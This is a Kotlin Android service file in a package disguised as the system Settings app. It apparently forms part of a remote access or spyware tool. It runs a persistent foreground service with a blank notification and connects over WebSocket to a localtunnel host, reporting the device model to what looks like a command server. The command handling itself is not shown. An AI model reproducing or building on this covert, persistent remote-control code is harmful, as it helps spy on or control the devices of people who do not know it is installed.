package com.android.system.settings

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import androidx.core.app.NotificationCompat

class ForegroundService: Service() {
    ///main foreground service function
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()

        //run settings when notification is pressed
        val settingsIntent = Intent(Settings.ACTION_SETTINGS)
        val pendingIntent = PendingIntent.getActivity(this,0,settingsIntent, PendingIntent.FLAG_IMMUTABLE)

        val notification  = NotificationCompat.Builder(this,"123")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentTitle("")
            .setContentIntent(pendingIntent)
            .build()
        startForeground(1,notification)
        val uri = "effinglitch1509xv.loca.lt"
        val serverUrl = "https://${uri}/{\"username\":\"${Build.MODEL}\",\"os\":\"android\"}" // Replace with your server address
        Websocket().connectToWebSocket(serverUrl,this)

        return START_STICKY
    }

    //notification channel
    private fun createNotificationChannel() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            val notificationChannel = NotificationChannel("123","settings", NotificationManager.IMPORTANCE_DEFAULT)
            val notificationManager: NotificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(notificationChannel)
        }
    }


    override fun onBind(intent: Intent?): IBinder? {
        TODO("")
    }
}
